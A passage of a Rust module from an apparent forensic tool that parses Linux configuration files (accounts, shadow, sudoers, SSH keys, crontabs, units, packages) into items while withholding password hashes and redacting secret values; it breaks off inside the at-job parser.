//! Parsing each kind of configuration file into items: one key, one value, one kind.
//!
//! Every parser is a pure function over the file's text, so the work runs on any thread
//! and the result does not depend on the order files are read in. A parser never fails a
//! whole file for one bad line: the line is counted, reported once per file with its
//! code, and the other lines go on. Secrets are never copied out: `/etc/shadow` gives the
//! state of each password and its hashing scheme, never the hash, and values whose key
//! names a password, a pre-shared key, a token or a secret are replaced by their length.

use std::collections::BTreeMap;

use evidencefs::time::Timestamp;

pub mod code {
    crate::codes! {
        PARSE_STARTED = 200, "a configuration file is about to be parsed with the parser named in the message (shown with -vv)";
        PARSE_DONE = 201, "a configuration file was parsed; the message gives the parser and the item count (shown with -vv)";
        PARSE_BINARY = 202, "the file holds NUL bytes in its first 8 KB: it is not text (a compiled generator, a database), so it is listed as one file item and not parsed";
        PARSE_NOT_UTF8 = 203, "the file is not valid UTF-8; invalid sequences were replaced with U+FFFD and the rest parsed as text";
        PARSE_EMPTY = 204, "the file is empty (or holds only comments and blank lines); it is listed in the inventory with no items";
        PARSE_TOO_MANY_ITEMS = 205, "the file gave more items than --max-items allows; the rest of the file was not read (raise the limit for a huge package database)";
        PARSE_PASSWD_BAD_LINE = 210, "lines of a passwd file do not have the seven colon-separated fields; they were skipped and counted";
        PARSE_PASSWD_BAD_UID = 211, "a passwd line has a uid or gid that is not a number; the account is kept with the text as written";
        PARSE_PASSWD_DUPLICATE = 212, "the same account name appears twice in a passwd file; both lines are kept (the first one wins at login), worth a look";
        PARSE_GROUP_BAD_LINE = 213, "lines of a group file do not have the four colon-separated fields; they were skipped and counted";
        PARSE_SHADOW_BAD_LINE = 214, "lines of a shadow or gshadow file do not have enough colon-separated fields; they were skipped and counted";
        PARSE_SHADOW_HASH_WITHHELD = 215, "password hashes were read from shadow/gshadow only to classify them (set, empty, locked, disabled) and name the scheme; no hash is written anywhere";
        PARSE_SHADOW_BAD_DATE = 216, "a shadow field that holds days since 1970 (last change, expiry) is not a number; it is shown as written and gives no row time";
        PARSE_SUDO_BAD_LINE = 220, "a sudoers line is neither a Defaults line, an alias, an include nor a user specification with an equal sign; it is kept as an unparsed line";
        PARSE_SUDO_CONTINUATION = 221, "a sudoers or shell line ends with a backslash and was joined with the next line before parsing (shown with -vv)";
        PARSE_SUDO_INCLUDE = 222, "a sudoers file includes another file or folder (@include, #includedir); the target is read when it is in the evidence, and the include itself is an item";
        PARSE_SSH_BAD_LINE = 230, "an SSH configuration line has a keyword and no value; it is kept with an empty value";
        PARSE_SSH_MATCH_BLOCK = 231, "an SSH configuration has Match or Host blocks: the directives inside are keyed `Match <criteria>|<Keyword>` so a rule can tell them from the global ones";
        PARSE_KEY_BAD_LINE = 232, "an authorized_keys or known_hosts line holds no recognised key type (ssh-rsa, ssh-ed25519, ecdsa-sha2-*, sk-*, ssh-dss); it is kept as an unparsed line";
        PARSE_KEY_HASHED_HOST = 233, "known_hosts entries are hashed (HashKnownHosts): the host names cannot be read, only the key types (shown with -vv)";
        PARSE_HOSTS_BAD_LINE = 234, "a hosts-file line has an address and no name; it is kept with an empty value";
        PARSE_FSTAB_BAD_LINE = 240, "an fstab, crypttab or exports line has fewer fields than the format needs; it is kept with what it has";
        PARSE_CRON_BAD_LINE = 241, "a crontab line has neither five schedule fields nor an @keyword before the command; it is kept as an unparsed line";
        PARSE_CRON_ENV = 242, "a crontab sets an environment variable (SHELL, PATH, MAILTO...) for its jobs; it is an item of kind cron_env";
        PARSE_AT_JOB = 243, "an at job file was read: the shell header at writes is skipped and the commands after it are items";
        PARSE_UNIT_BAD_LINE = 250, "a line of a systemd unit or INI file is neither a [Section] header nor Key=Value; it is kept as an unparsed line";
        PARSE_UNIT_NO_SECTION = 251, "a Key=Value line comes before any [Section] header; it is keyed without a section";
        PARSE_UNIT_DROPIN = 252, "a systemd drop-in (unit.d/*.conf) was read; its directives override the unit's and are keyed the same way (shown with -vv)";
        PARSE_PAM_BAD_LINE = 260, "a PAM line does not have a type, a control and a module; it is kept as an unparsed line";
        PARSE_PAM_INCLUDE = 261, "a PAM file includes or substacks another one (@include, include, substack); the target is its own file and the include is an item";
        PARSE_APT_BAD_LINE = 270, "an APT sources line does not start with deb or deb-src followed by a URI; it is kept as an unparsed line";
        PARSE_APT_DEB822 = 271, "an APT .sources file in the deb822 format was read: each stanza is one source item keyed by its URIs";
        PARSE_DPKG_STANZA_BAD = 272, "a stanza of /var/lib/dpkg/status has no Package field; it was skipped and counted";
        PARSE_DPKG_INSTALL_TIME = 273, "package rows take the time of the package's file list under /var/lib/dpkg/info (written at install or upgrade); packages without one take the status file's time";
        PARSE_RPM_UNSUPPORTED = 274, "an RPM database (rpmdb.sqlite, Packages) is in the evidence; it is listed as a file but its packages are not read (use rpm --dbpath on a copy)";
        PARSE_KV_BAD_LINE = 280, "a line of a key=value, key: value or key value file has no separator; it is kept with an empty value";
        PARSE_SECRET_REDACTED = 281, "a value whose key names a password, pre-shared key, token or secret was replaced by its length (`<redacted N chars>`); the setting is visible, its secret is not";
        PARSE_LOGROTATE_SCRIPT = 282, "a logrotate file runs a prerotate/postrotate/firstaction/lastaction script; its lines are items of kind logrotate_script";
        PARSE_SCRIPT_SHEBANG = 290, "a script's first line names its interpreter; it is an item of kind shebang (shown with -vv)";
        PARSE_SCRIPT_LONG_LINE = 291, "a line longer than 4096 characters was cut there in the item (the full line is in the evidence)";
        PARSE_LINK = 292, "the file is a symbolic link (an rc?.d entry, an enabled unit); it is one item whose value is the link target";
        PARSE_FILE_ONLY = 293, "the file is listed as one item (name and size) because its kind is not parsed line by line (a generator binary, a database, a lock)";
    }
}

/// How a file is read.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum Parser {
    Passwd,
    Group,
    Shadow,
    Gshadow,
    Sudoers,
    SshConfig,
    AuthorizedKeys,
    KnownHosts,
    Hosts,
    /// `key value` per line (resolv.conf, login.defs).
    KvSpace,
    /// `key: value` per line (nsswitch.conf).
    KvColon,
    /// `key=value` per line, `export` and quotes stripped (environment, /etc/default/*).
    KvEq,
    Fstab,
    Crypttab,
    Exports,
    /// A system crontab (`/etc/crontab`, `/etc/cron.d/*`): schedule, user, command.
    CronSystem,
    /// A user crontab (`/var/spool/cron/crontabs/<user>`): schedule, command.
    CronUser,
    AtJob,
    /// A systemd unit or drop-in.
    Unit,
    /// Any INI file (yum repos, desktop entries, NetworkManager).
    Ini,
    Pam,
    AptSources,
    AptDeb822,
    AptConf,
    DpkgStatus,
    RpmDb,
    Logrotate,
    /// A shell script or profile: one item per command line.
    Script,
    /// Any text: one item per non-comment line.
    Lines,
    /// Not read line by line: one item with the size (binaries, databases).
    FileOnly,
}

impl Parser {
    /// The parser's name, as the inventory and the `parser` notes show it.
    pub fn name(self) -> &'static str {
        match self {
            Parser::Passwd => "passwd",
            Parser::Group => "group",
            Parser::Shadow => "shadow",
            Parser::Gshadow => "gshadow",
            Parser::Sudoers => "sudoers",
            Parser::SshConfig => "ssh_config",
            Parser::AuthorizedKeys => "authorized_keys",
            Parser::KnownHosts => "known_hosts",
            Parser::Hosts => "hosts",
            Parser::KvSpace => "key_value_space",
            Parser::KvColon => "key_value_colon",
            Parser::KvEq => "key_value_equals",
            Parser::Fstab => "fstab",
            Parser::Crypttab => "crypttab",
            Parser::Exports => "exports",
            Parser::CronSystem => "crontab_system",
            Parser::CronUser => "crontab_user",
            Parser::AtJob => "at_job",
            Parser::Unit => "systemd_unit",
            Parser::Ini => "ini",
            Parser::Pam => "pam",
            Parser::AptSources => "apt_sources",
            Parser::AptDeb822 => "apt_deb822",
            Parser::AptConf => "apt_conf",
            Parser::DpkgStatus => "dpkg_status",
            Parser::RpmDb => "rpm_db",
            Parser::Logrotate => "logrotate",
            Parser::Script => "script",
            Parser::Lines => "lines",
            Parser::FileOnly => "file",
        }
    }
}

/// One configuration item.
#[derive(Clone, Debug, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub struct Item {
    /// What the item is called: the account, the directive, the schedule, the command.
    pub key: String,
    /// What it says, decoded (`uid=0 gid=0 home=/root shell=/bin/bash`, a unit's value, a
    /// whole command line).
    pub value: String,
    /// `account`, `sudo_rule`, `directive`, `cron_job`, `command`...
    pub kind: &'static str,
    /// 1-based line in the file (0 for a whole-file item).
    pub line: usize,
    /// The account the item concerns, when the item itself says (passwd, a user crontab).
    pub user: String,
    /// A time the item itself carries (shadow's last change, a package's install), with
    /// its source name; else the row takes the file's time.
    pub time: Option<(Timestamp, &'static str)>,
}

impl Item {
    pub fn new(key: impl Into<String>, value: impl Into<String>, kind: &'static str, line: usize) -> Item {
        Item { key: key.into(), value: value.into(), kind, line, user: String::new(), time: None }
    }

    fn user(mut self, u: impl Into<String>) -> Item {
        self.user = u.into();
        self
    }

    fn at(mut self, t: Option<Timestamp>, source: &'static str) -> Item {
        self.time = t.map(|t| (t, source));
        self
    }
}

/// What a parser needs besides the text.
#[derive(Clone, Debug, Default)]
pub struct Ctx {
    /// The file name (for a user crontab: the user).
    pub file_name: String,
    /// The file is a link to this target (rc?.d entries, enabled units).
    pub link_target: Option<String>,
    /// The file's size.
    pub size: u64,
    /// Package name to the time of its `/var/lib/dpkg/info/<pkg>.list`.
    pub dpkg_times: BTreeMap<String, Timestamp>,
    /// Most items one file may give.
    pub max_items: usize,
}

/// The result of parsing one file.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Parsed {
    pub items: Vec<Item>,
    /// Lines that could not be parsed, per code.
    pub bad_lines: usize,
    /// Values replaced by their length.
    pub redacted: usize,
    /// The file was cut at max_items.
    pub truncated: bool,
}

const LONG_LINE: usize = 4096;

/// Parses a file's bytes with the given parser.
pub fn parse(parser: Parser, bytes: &[u8], ctx: &Ctx) -> Parsed {
    crate::diag::record(code::PARSE_STARTED, crate::diag::Severity::Info, format!("{} ({})", ctx.file_name, parser.name()));
    if let Some(target) = &ctx.link_target {
        crate::diag::info(code::PARSE_LINK, format!("{} -> {target}", ctx.file_name));
        return Parsed { items: vec![Item::new(ctx.file_name.clone(), format!("link={target}"), "link", 0)], ..Default::default() };
    }
    if matches!(parser, Parser::FileOnly | Parser::RpmDb) {
        if parser == Parser::RpmDb {
            crate::diag::warn(code::PARSE_RPM_UNSUPPORTED, ctx.file_name.clone());
        } else {
            crate::diag::info(code::PARSE_FILE_ONLY, ctx.file_name.clone());
        }
        return Parsed { items: vec![Item::new(ctx.file_name.clone(), format!("size={}", ctx.size), "file", 0)], ..Default::default() };
    }
    let head = &bytes[..bytes.len().min(8192)];
    if head.contains(&0) {
        crate::diag::info(code::PARSE_BINARY, ctx.file_name.clone());
        return Parsed { items: vec![Item::new(ctx.file_name.clone(), format!("size={} binary", ctx.size), "file", 0)], ..Default::default() };
    }
    let text = match std::str::from_utf8(bytes) {
        Ok(t) => t.to_string(),
        Err(_) => {
            crate::diag::warn(code::PARSE_NOT_UTF8, ctx.file_name.clone());
            String::from_utf8_lossy(bytes).into_owned()
        }
    };
    let mut out = match parser {
        Parser::Passwd => passwd(&text),
        Parser::Group => group(&text),
        Parser::Shadow => shadow(&text, false),
        Parser::Gshadow => shadow(&text, true),
        Parser::Sudoers => sudoers(&text),
        Parser::SshConfig => ssh_config(&text),
        Parser::AuthorizedKeys => keys(&text, false),
        Parser::KnownHosts => keys(&text, true),
        Parser::Hosts => hosts(&text),
        Parser::KvSpace => kv(&text, Sep::Space),
        Parser::KvColon => kv(&text, Sep::Colon),
        Parser::KvEq => kv(&text, Sep::Equals),
        Parser::Fstab => fstab(&text),
        Parser::Crypttab => crypttab(&text),
        Parser::Exports => exports(&text),
        Parser::CronSystem => cron(&text, None),
        Parser::CronUser => cron(&text, Some(ctx.file_name.as_str())),
        Parser::AtJob => at_job(&text, &ctx.file_name),
        Parser::Unit => ini(&text, "directive"),
        Parser::Ini => ini(&text, "setting"),
        Parser::Pam => pam(&text),
        Parser::AptSources => apt_sources(&text),
        Parser::AptDeb822 => apt_deb822(&text),
        Parser::AptConf => lines(&text, "apt_conf", &['#']),
        Parser::DpkgStatus => dpkg_status(&text, &ctx.dpkg_times),
        Parser::Logrotate => logrotate(&text),
        Parser::Script => script(&text),
        Parser::Lines => lines(&text, "line", &['#', ';']),
        Parser::FileOnly | Parser::RpmDb => unreachable!(),
    };
    if out.items.is_empty() {
        crate::diag::info(code::PARSE_EMPTY, ctx.file_name.clone());
    }
    let max = if ctx.max_items == 0 { usize::MAX } else { ctx.max_items };
    if out.items.len() > max {
        out.items.truncate(max);
        out.truncated = true;
        crate::diag::warn(code::PARSE_TOO_MANY_ITEMS, format!("{}: cut at {max}", ctx.file_name));
    }
    for it in &mut out.items {
        if it.value.chars().count() > LONG_LINE {
            it.value = it.value.chars().take(LONG_LINE).collect();
            crate::diag::info(code::PARSE_SCRIPT_LONG_LINE, format!("{}:{}", ctx.file_name, it.line));
        }
    }
    crate::diag::record(code::PARSE_DONE, crate::diag::Severity::Info, format!("{} ({}): {} item(s)", ctx.file_name, parser.name(), out.items.len()));
    out
}

/// Lines with their 1-based numbers, trailing CR removed.
fn numbered(text: &str) -> impl Iterator<Item = (usize, &str)> {
    text.split('\n').enumerate().map(|(i, l)| (i + 1, l.trim_end_matches('\r')))
}

/// Lines with backslash continuations joined, each with the number of its first line.
fn joined(text: &str) -> Vec<(usize, String)> {
    let mut out = Vec::new();
    let mut cur: Option<(usize, String)> = None;
    let mut joined_any = false;
    for (n, l) in numbered(text) {
        let (body, cont) = match l.strip_suffix('\\') {
            Some(b) => (b, true),
            None => (l, false),
        };
        match cur.as_mut() {
            Some((_, s)) => {
                s.truncate(s.trim_end().len());
                s.push(' ');
                s.push_str(body.trim_start());
            }
            None => cur = Some((n, body.to_string())),
        }
        if cont {
            joined_any = true;
        } else if let Some((n0, mut c)) = cur.take() {
            c.truncate(c.trim_end().len());
            out.push((n0, c));
        }
    }
    if let Some(c) = cur.take() {
        out.push(c);
    }
    if joined_any {
        crate::diag::record(code::PARSE_SUDO_CONTINUATION, crate::diag::Severity::Info, "continuation lines joined");
    }
    out
}

fn is_comment(l: &str, marks: &[char]) -> bool {
    let t = l.trim_start();
    t.is_empty() || marks.iter().any(|m| t.starts_with(*m))
}

/// A shell is interactive unless it is empty or one of the no-login ones.
pub fn is_interactive_shell(shell: &str) -> bool {
    let s = shell.trim();
    if s.is_empty() {
        return false;
    }
    let base = s.rsplit('/').next().unwrap_or(s);
    !matches!(base, "nologin" | "false" | "sync" | "halt" | "shutdown" | "true")
}

/// Days since 1970 as a time.
fn days(field: &str) -> Option<Timestamp> {
    let d: i64 = field.trim().parse().ok()?;
    if d <= 0 {
        return None;
    }
    Some(Timestamp::from_unix(d * 86_400, 0))
}

fn date_of(t: Timestamp) -> String {
    t.to_rfc3339_micros()[..10].to_string()
}

fn passwd(text: &str) -> Parsed {
    let mut p = Parsed::default();
    let mut seen = std::collections::HashSet::new();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let f: Vec<&str> = l.split(':').collect();
        if f.len() != 7 {
            p.bad_lines += 1;
            continue;
        }
        let (uid, gid) = (f[2].trim(), f[3].trim());
        if uid.parse::<u64>().is_err() || gid.parse::<u64>().is_err() {
            crate::diag::warn(code::PARSE_PASSWD_BAD_UID, format!("line {n}: {}", f[0]));
        }
        if !seen.insert(f[0].to_string()) {
            crate::diag::warn(code::PARSE_PASSWD_DUPLICATE, format!("line {n}: {}", f[0]));
        }
        let system = uid.parse::<u64>().map(|u| u > 0 && u < 1000).unwrap_or(false);
        let interactive = is_interactive_shell(f[6]);
        let value = format!("uid={uid} gid={gid} home={} shell={} system={} interactive={} gecos={}", f[5], f[6], yes(system), yes(interactive), f[4]);
        p.items.push(Item::new(f[0], value, "account", n).user(f[0]));
    }
    if p.bad_lines > 0 {
        crate::diag::warn(code::PARSE_PASSWD_BAD_LINE, format!("{} line(s)", p.bad_lines));
    }
    p
}

fn yes(b: bool) -> &'static str {
    if b {
        "yes"
    } else {
        "no"
    }
}

/// Groups whose members can become root or read what root reads.
pub const PRIVILEGED_GROUPS: &[&str] = &["root", "sudo", "wheel", "admin", "adm", "docker", "lxd", "disk", "shadow", "libvirt", "kvm"];

fn group(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let f: Vec<&str> = l.split(':').collect();
        if f.len() != 4 {
            p.bad_lines += 1;
            continue;
        }
        let privileged = PRIVILEGED_GROUPS.contains(&f[0]);
        p.items.push(Item::new(f[0], format!("gid={} members={} privileged={}", f[2], f[3], yes(privileged)), "group", n));
    }
    if p.bad_lines > 0 {
        crate::diag::warn(code::PARSE_GROUP_BAD_LINE, format!("{} line(s)", p.bad_lines));
    }
    p
}

/// What a shadow password field says, without the hash: state and scheme.
pub fn password_state(field: &str) -> (&'static str, &'static str) {
    let f = field.trim();
    if f.is_empty() {
        return ("empty", "none");
    }
    if f == "*" || f == "!" || f == "!!" || f == "!*" || f == "x" {
        return ("disabled", "none");
    }
    let (locked, rest) = match f.strip_prefix('!') {
        Some(r) => (true, r),
        None => (false, f),
    };
    let scheme = if rest.starts_with("$y$") {
        "yescrypt"
    } else if rest.starts_with("$6$") {
        "sha512crypt"
    } else if rest.starts_with("$5$") {
        "sha256crypt"
    } else if rest.starts_with("$2") {
        "bcrypt"
    } else if rest.starts_with("$1$") {
        "md5crypt"
    } else if rest.starts_with("$gy$") {
        "gost-yescrypt"
    } else if rest.starts_with('$') {
        "other"
    } else if rest.len() == 13 {
        "des"
    } else {
        "unknown"
    };
    (if locked { "locked" } else { "set" }, scheme)
}

fn shadow(text: &str, gshadow: bool) -> Parsed {
    let mut p = Parsed::default();
    let mut any = false;
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let f: Vec<&str> = l.split(':').collect();
        let need = if gshadow { 4 } else { 8 };
        if f.len() < need {
            p.bad_lines += 1;
            continue;
        }
        any = true;
        let (state, scheme) = password_state(f[1]);
        if gshadow {
            p.items.push(Item::new(f[0], format!("password={state} scheme={scheme} admins={} members={}", f[2], f[3]), "gshadow", n));
            continue;
        }
        let last = days(f[2]);
        if !f[2].trim().is_empty() && last.is_none() && f[2].trim() != "0" {
            crate::diag::warn(code::PARSE_SHADOW_BAD_DATE, format!("line {n}: {}", f[0]));
        }
        let expire = days(f[7]).map(date_of).unwrap_or_default();
        let value = format!(
            "password={state} scheme={scheme} last_change={} min={} max={} warn={} inactive={} expire={expire}",
            last.map(date_of).unwrap_or_else(|| f[2].trim().to_string()),
            f[3].trim(),
            f[4].trim(),
            f[5].trim(),
            f[6].trim()
        );
        p.items.push(Item::new(f[0], value, "shadow", n).user(f[0]).at(last, "shadow_last_change"));
    }
    if any {
        crate::diag::info(code::PARSE_SHADOW_HASH_WITHHELD, "hashes classified, not copied");
    }
    if p.bad_lines > 0 {
        crate::diag::warn(code::PARSE_SHADOW_BAD_LINE, format!("{} line(s)", p.bad_lines));
    }
    p
}

fn sudoers(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, raw) in joined(text) {
        let l = raw.trim();
        if l.is_empty() {
            continue;
        }
        let lower = l.to_ascii_lowercase();
        if lower.starts_with("#include") || lower.starts_with("@include") {
            let mut it = l.splitn(2, char::is_whitespace);
            let word = it.next().unwrap_or("");
            crate::diag::info(code::PARSE_SUDO_INCLUDE, l.to_string());
            p.items.push(Item::new(word.trim_start_matches(['#', '@']), it.next().unwrap_or("").trim(), "include", n));
            continue;
        }
        if l.starts_with('#') {
            continue;
        }
        if l.starts_with("Defaults") {
            let mut it = l.splitn(2, char::is_whitespace);
            p.items.push(Item::new(it.next().unwrap_or("Defaults"), it.next().unwrap_or("").trim(), "sudo_default", n));
            continue;
        }
        if let Some(kind) = ["User_Alias", "Runas_Alias", "Host_Alias", "Cmnd_Alias", "Cmd_Alias"].iter().find(|k| l.starts_with(**k)) {
            let rest = l[kind.len()..].trim();
            let (name, def) = rest.split_once('=').unwrap_or((rest, ""));
            p.items.push(Item::new(format!("{kind} {}", name.trim()), def.trim(), "sudo_alias", n));
            continue;
        }
        let mut it = l.splitn(2, char::is_whitespace);
        let who = it.next().unwrap_or("");
        let rest = it.next().unwrap_or("").trim();
        if !rest.contains('=') {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_SUDO_BAD_LINE, format!("line {n}"));
            p.items.push(Item::new(who, rest, "unparsed", n));
            continue;
        }
        p.items.push(Item::new(who, rest, "sudo_rule", n).user(who.trim_start_matches('%')));
    }
    p
}

fn ssh_config(text: &str) -> Parsed {
    let mut p = Parsed::default();
    let mut block: Option<String> = None;
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let t = l.trim();
        let (k, v) = match t.find(|c: char| c.is_whitespace() || c == '=') {
            Some(i) => (&t[..i], t[i..].trim_start_matches(|c: char| c.is_whitespace() || c == '=').trim()),
            None => (t, ""),
        };
        if v.is_empty() {
            crate::diag::warn(code::PARSE_SSH_BAD_LINE, format!("line {n}: {k}"));
        }
        if k.eq_ignore_ascii_case("Match") || k.eq_ignore_ascii_case("Host") {
            if block.is_none() {
                crate::diag::info(code::PARSE_SSH_MATCH_BLOCK, format!("line {n}"));
            }
            block = Some(format!("{k} {v}"));
            p.items.push(Item::new(k, v, "block", n));
            continue;
        }
        let key = match &block {
            Some(b) => format!("{b}|{k}"),
            None => k.to_string(),
        };
        let kind = if k.eq_ignore_ascii_case("Include") { "include" } else { "directive" };
        p.items.push(Item::new(key, v, kind, n));
    }
    p
}

/// The key types an authorized_keys or known_hosts line can name.
pub fn is_key_type(t: &str) -> bool {
    matches!(t, "ssh-rsa" | "ssh-ed25519" | "ssh-dss") || t.starts_with("ecdsa-sha2-") || t.starts_with("sk-") || t.starts_with("ssh-rsa-cert") || t.starts_with("ssh-ed25519-cert")
}

/// Splits on spaces outside double quotes.
fn tokens(l: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quoted = false;
    for c in l.chars() {
        match c {
            '"' => {
                quoted = !quoted;
                cur.push(c);
            }
            c if c.is_whitespace() && !quoted => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            c => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

fn keys(text: &str, known_hosts: bool) -> Parsed {
    let mut p = Parsed::default();
    let mut hashed = false;
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let toks = tokens(l.trim());
        let Some(ti) = toks.iter().position(|t| is_key_type(t)) else {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_KEY_BAD_LINE, format!("line {n}"));
            p.items.push(Item::new(format!("line {n}"), l.trim(), "unparsed", n));
            continue;
        };
        let ktype = &toks[ti];
        let blob = toks.get(ti + 1).map(|s| s.as_str()).unwrap_or("");
        let head: String = blob.chars().take(24).collect();
        let comment = toks.get(ti + 2..).map(|c| c.join(" ")).unwrap_or_default();
        let before = toks[..ti].join(" ");
        if known_hosts {
            let hosts = before.trim_start_matches("@cert-authority ").trim_start_matches("@revoked ").to_string();
            if hosts.starts_with("|1|") {
                hashed = true;
            }
            let key = if hosts.starts_with("|1|") { "hashed".to_string() } else { hosts };
            let marker = if before.starts_with('@') { before.split_whitespace().next().unwrap_or("") } else { "" };
            p.items.push(Item::new(key, format!("type={ktype} key={head} marker={marker}"), "known_host", n));
        } else {
            let key = if comment.is_empty() { format!("key {n}") } else { comment.clone() };
            p.items.push(Item::new(key, format!("type={ktype} key={head} options={before} comment={comment}"), "authorized_key", n));
        }
    }
    if hashed {
        crate::diag::record(code::PARSE_KEY_HASHED_HOST, crate::diag::Severity::Info, "hashed known_hosts");
    }
    p
}

fn hosts(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        let body = l.split('#').next().unwrap_or("");
        if body.trim().is_empty() {
            continue;
        }
        let mut it = body.split_whitespace();
        let ip = it.next().unwrap_or("");
        let names: Vec<&str> = it.collect();
        if names.is_empty() {
            crate::diag::warn(code::PARSE_HOSTS_BAD_LINE, format!("line {n}: {ip}"));
        }
        p.items.push(Item::new(ip, names.join(" "), "host_entry", n));
    }
    p
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Sep {
    Space,
    Colon,
    Equals,
}

/// Does this key name a secret whose value must not be copied?
pub fn is_secret_key(key: &str) -> bool {
    let k = key.to_ascii_lowercase();
    ["password", "passwd", "psk", "secret", "token", "private-key", "private_key", "api_key", "apikey", "wep-key", "leap-password"].iter().any(|s| k.contains(s)) && !k.contains("-flags") && !k.ends_with("authentication")
}

/// The redacted form of a secret value.
pub fn redacted(v: &str) -> String {
    format!("<redacted {} chars>", v.chars().count())
}

fn unquote(v: &str) -> &str {
    let v = v.trim();
    if v.len() >= 2 && ((v.starts_with('"') && v.ends_with('"')) || (v.starts_with('\'') && v.ends_with('\''))) {
        &v[1..v.len() - 1]
    } else {
        v
    }
}

fn kv(text: &str, sep: Sep) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#', ';']) {
            continue;
        }
        let t = l.trim();
        let t = if sep == Sep::Equals { t.strip_prefix("export ").unwrap_or(t).trim() } else { t };
        let split = match sep {
            Sep::Space => t.find(char::is_whitespace).map(|i| (&t[..i], t[i..].trim())),
            Sep::Colon => t.split_once(':').map(|(a, b)| (a.trim(), b.trim())),
            Sep::Equals => t.split_once('=').map(|(a, b)| (a.trim(), unquote(b))),
        };
        let (k, v) = match split {
            Some(kv) => kv,
            None => {
                p.bad_lines += 1;
                crate::diag::warn(code::PARSE_KV_BAD_LINE, format!("line {n}"));
                (t, "")
            }
        };
        let value = if is_secret_key(k) && !v.is_empty() {
            p.redacted += 1;
            crate::diag::info(code::PARSE_SECRET_REDACTED, format!("line {n}: {k}"));
            redacted(v)
        } else {
            v.to_string()
        };
        p.items.push(Item::new(k, value, "setting", n));
    }
    p
}

fn fstab(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let f: Vec<&str> = l.split_whitespace().collect();
        if f.len() < 3 {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_FSTAB_BAD_LINE, format!("line {n}"));
        }
        let get = |i: usize| f.get(i).copied().unwrap_or("");
        let opts = if is_secret_key(get(3)) { redacted(get(3)) } else { get(3).to_string() };
        p.items.push(Item::new(get(1), format!("device={} type={} options={opts} dump={} pass={}", get(0), get(2), get(4), get(5)), "mount", n));
    }
    p
}

fn crypttab(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let f: Vec<&str> = l.split_whitespace().collect();
        if f.len() < 2 {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_FSTAB_BAD_LINE, format!("line {n}"));
        }
        let get = |i: usize| f.get(i).copied().unwrap_or("");
        p.items.push(Item::new(get(0), format!("device={} keyfile={} options={}", get(1), get(2), get(3)), "crypt", n));
    }
    p
}

fn exports(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let t = l.trim();
        let (path, clients) = match t.find(char::is_whitespace) {
            Some(i) => (&t[..i], t[i..].trim()),
            None => {
                p.bad_lines += 1;
                crate::diag::warn(code::PARSE_FSTAB_BAD_LINE, format!("line {n}"));
                (t, "")
            }
        };
        p.items.push(Item::new(path, clients, "export", n));
    }
    p
}

/// The schedule words a crontab accepts instead of five fields.
const CRON_WORDS: &[&str] = &["@reboot", "@yearly", "@annually", "@monthly", "@weekly", "@daily", "@midnight", "@hourly"];

fn cron(text: &str, user_file: Option<&str>) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let t = l.trim();
        let first = t.split_whitespace().next().unwrap_or("");
        // An environment line: NAME=value with no space before the equal sign.
        if let Some((k, v)) = t.split_once('=') {
            if !k.contains(char::is_whitespace) && !k.is_empty() && !first.starts_with('@') && !first.chars().next().is_some_and(|c| c.is_ascii_digit() || c == '*') {
                crate::diag::info(code::PARSE_CRON_ENV, format!("line {n}: {k}"));
                p.items.push(Item::new(k.trim(), unquote(v), "cron_env", n));
                continue;
            }
        }
        let toks: Vec<&str> = t.split_whitespace().collect();
        let (schedule, rest_at) = if CRON_WORDS.contains(&first) {
            (first.to_string(), 1)
        } else if toks.len() >= 6 && toks[..5].iter().all(|f| f.chars().all(|c| c.is_ascii_alphanumeric() || "*/,-".contains(c))) {
            (toks[..5].join(" "), 5)
        } else {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_CRON_BAD_LINE, format!("line {n}"));
            p.items.push(Item::new(format!("line {n}"), t, "unparsed", n));
            continue;
        };
        let rest = &toks[rest_at..];
        let (user, cmd) = match user_file {
            Some(u) => (u.to_string(), rest.join(" ")),
            None => (rest.first().copied().unwrap_or("").to_string(), rest.get(1..).map(|r| r.join(" ")).unwrap_or_default()),
        };
        p.items.push(Item::new(schedule, format!("user={user} command={cmd}"), "cron_job", n).user(user));
    }
    p
}

fn at_job(text: &str, file_name: &str) -> Parsed {
    // at writes a header (umask, exported variables, cd) and a marker; the commands follow.
    let mut p = Parsed::default();
    let body_start = text.find("marcinDELIMITER").and_then(|i| text[i..].find('\n').map(|j| i + j + 1));
    let (skip_to, mut user) = (body_start.map(|b| text[..b].lines().count()).unwrap_or(0), String::new());
    for (n, l) in numbered(text) {
        if let Some(u) = l.strip_prefix("# atrun uid=") {
            user = u.split_whitespace().next().unwrap_or("").to_string();
        }
        if n <= skip_to || is_comment(l, &['#']) || l.contains("marcinDELIMITER") {
            continue;
        }
        let t = l.trim();
